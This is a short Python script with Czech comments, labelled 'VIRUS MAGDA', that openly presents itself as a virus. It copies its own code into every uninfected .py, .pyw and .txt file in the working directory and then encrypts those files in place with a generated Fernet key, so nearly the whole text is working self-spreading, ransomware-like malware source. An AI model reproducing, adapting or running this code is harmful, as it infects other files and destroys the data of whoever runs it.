#VIRUS MAGDA
import sys
import glob
from cryptography.fernet import Fernet
import os


Virus = []

script = open(sys.argv[0], "r")
lines = script.readlines()
script.close()

###Zde definujeme oblast viru -> začíná nadpisem VIRUS MAGDA končí SBOHEM###
Nakazeny = False
for line in lines:
    if line == "#VIRUS MAGDA":
        Nakazeny = True
    if not Nakazeny:
        Virus.append(line)
    if line == "# SBOHEM \n":
        break

###Zde hledám python soubory, které otevřeme, přečteme, zjistíme, zda je už soubor infikovaný (podle nadpisu VIRUS MAGDA)
###Pokud soubor není nakažený, tak do něj vložíme náš škodlivý kód
pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*.txt')
for file in pythonSoubory:
    script = open(file, "r")
    Kod = script.readlines()
    script.close()

    Nakazeny = False

    for line in Kod:
        if line == "#VIRUS MAGDA\n":
            Nakazeny = True
            break
            

    if not Nakazeny:
        NemocnyKod = []
        NemocnyKod.extend(Virus)
        NemocnyKod.extend('\n')
        NemocnyKod.extend(Kod)

        script = open(file, 'w')
        script.writelines(NemocnyKod)
        script.close()
###Zde je náš škodlivý kód

def write_key():
   
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def encrypt(filename, key):
   
    f = Fernet(key)
    with open(filename, "rb") as file:
    # precteme vsechna data
        file_data = file.read()
    # zasifrujeme data
        encrypted_data = f.encrypt(file_data)
    # vytvorime novy zasifrovany soubor
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def load_key():
    
    return open("key.key", "rb").read()

#vytvoříme klíč
write_key()
#načteme klíč
key = load_key()
#projdeme soubory, po nalezení souborů s uvedenými koncovkami dojde k zašifrování
pythonSoubory2 = glob.glob('*.py') + glob.glob('*.pyw')+ glob.glob('*.txt')
for file in pythonSoubory2:
    encrypt (file,key)



#SBOHEM

